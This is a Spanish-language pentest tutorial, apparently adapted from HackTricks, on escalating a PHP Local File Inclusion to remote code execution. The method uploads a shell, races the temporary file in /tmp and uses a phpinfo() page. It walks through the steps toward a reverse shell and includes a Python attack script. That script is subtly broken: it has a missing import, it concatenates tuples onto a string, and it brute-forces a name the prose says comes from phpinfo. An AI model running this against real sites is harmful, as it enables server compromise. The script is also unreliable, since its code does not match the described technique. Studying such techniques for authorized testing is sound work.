
---
# Subida de Archivos mediante LFI2RCE con phpinfo()

En un pentest, si encontramos una vulnerabilidad LFI (Local File Inclusion) y la directiva `file_uploads` está activada en PHP, podemos intentar ejecutar código malicioso aprovechando los archivos temporales generados durante la subida de archivos.

## Requisitos

- Vulnerabilidad LFI en la aplicación web.
- Directiva `file_uploads = On` en la configuración de PHP.
- Directorio `/tmp` con permisos de escritura por parte del servidor.
- Acceso a una página que muestre la salida de `phpinfo()`.

## Procedimiento

1. **Subida del archivo malicioso**: Subimos un archivo PHP (por ejemplo, `shell.php`) a través de un formulario de subida. El archivo se almacena temporalmente en el directorio `/tmp` con un nombre aleatorio.

2. **Identificación del archivo temporal**: Accedemos a la página que muestra `phpinfo()` y buscamos la variable `$_FILES`. Esta variable contiene información sobre los archivos subidos, incluyendo el nombre del archivo temporal asignado por el servidor.

3. **Explotación de la LFI**: Utilizamos la vulnerabilidad LFI para incluir el archivo temporal antes de que sea eliminado por el servidor. Esto se puede lograr accediendo a la ruta completa del archivo temporal, por ejemplo, `/tmp/php12345`.

4. **Obtención de acceso remoto**: Si el archivo PHP contiene código malicioso, como una reverse shell, al incluirlo mediante LFI, se ejecutará en el servidor, otorgándonos acceso remoto.

## Ejemplo de script en Python

```python
import itertools
import requests
import sys

print('[+] Ejecutando Race Condition')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)

print('[+] Fuerza bruta del nombre del archivo temporal')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] Shell obtenida: ' + url)
        sys.exit(0)

print('[x] Algo salió mal, por favor intente nuevamente')
````

## Consideraciones

- **Sincronización**: La explotación de esta técnica depende de la sincronización entre la subida del archivo y la inclusión del mismo antes de su eliminación. Es posible que se requieran múltiples intentos.
    
- **Seguridad**: Esta técnica puede ser mitigada deshabilitando la subida de archivos o configurando adecuadamente los permisos en el directorio temporal.
    

Para más detalles, consulta la fuente original: [HackTricks - LFI2RCE via phpinfo()](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html)

